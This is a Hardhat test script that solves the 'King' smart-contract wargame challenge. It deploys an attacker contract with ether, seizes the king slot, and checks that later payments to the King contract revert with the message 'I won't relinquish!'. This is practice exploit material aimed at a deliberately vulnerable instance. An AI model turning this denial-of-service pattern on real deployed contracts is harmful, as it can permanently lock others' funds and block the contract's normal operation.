const { assert, expect } = require("chai")
const { network, ethers } = require("hardhat")
require("dotenv").config()

let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS9 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`King`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`KingAttacker`)
    /* We have to deploy KingAttack contract with some Ether.
    This value will be send to attacked contract (King).*/
    attacker = await attackerFactory.deploy(challenge.address, {
        value: ethers.utils.parseUnits("1", `ether`),
    })
})

it("Solves the challenge 'King'", async () => {
    tx = await attacker.getCrown()
    await tx.wait(1)

    /*Check if we are the king */
    let king = await challenge._king()
    assert(king == attacker.address, "You are not the king!")

    /*Let's check if someone other send more Ether to King
    contract we will still the king. We make it only when we 
    work in local blockchain*/
    if (network.config.chainId.toString() == 31337) {
        /*Check if someone send Ether to King contract get an
        error from out KingAttacker contract */
        await expect(
            player.sendTransaction({
                from: player.address,
                to: challenge.address,
                value: ethers.utils.parseUnits("2", `ether`),
                gasLimit: ethers.BigNumber.from(`100000`),
            })
        ).to.be.revertedWith("I won't relinquish!")

        /*Let's check if we still are the king */
        assert(king == attacker.address, "You are not the king!")
    }
})
